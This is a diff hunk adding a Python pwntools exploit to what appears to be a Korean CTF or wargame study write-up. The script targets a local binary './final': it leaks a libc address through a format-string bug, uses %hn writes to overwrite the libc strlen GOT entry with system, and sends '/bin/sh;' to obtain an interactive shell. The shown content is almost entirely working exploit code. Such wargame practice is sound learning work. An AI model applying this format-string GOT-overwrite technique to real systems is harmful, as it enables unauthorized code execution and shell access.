@@ -546,6 +546,30 @@ p.interactive()
 - 코드 분석
 - 익스플로잇 설계
 - 익스플로잇
+```python
+from pwn import *
+
+p = process('./final')
+l = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+payload = b"%33$p\n"
+p.sendafter(b': ', payload)
+l.address = int(p.recvline()[:-1], 16) - (0x7ffff7db3d90 - 0x7ffff7d8a000)
+
+strlen_got = l.address + 0x21a098
+system = l.sym['system']
+system1 = system & 0xffff
+system2 = (system >> 16) & 0xffff
+payload = b'/bin/sh;'
+payload += f"%{system1 - 8}c%32$hn".encode()
+payload += f"%{0x10000 - system1 + system2}c%33$hn".encode()
+payload = payload.ljust(0x28, b'a')
+payload += p64(strlen_got) + p64(strlen_got + 2)
+
+p.sendafter(b': ', b'Lord Of Buffer overflow')
+p.sendafter(b': ', payload)
+p.interactive()
+```
 
 ---
 ## 피드백
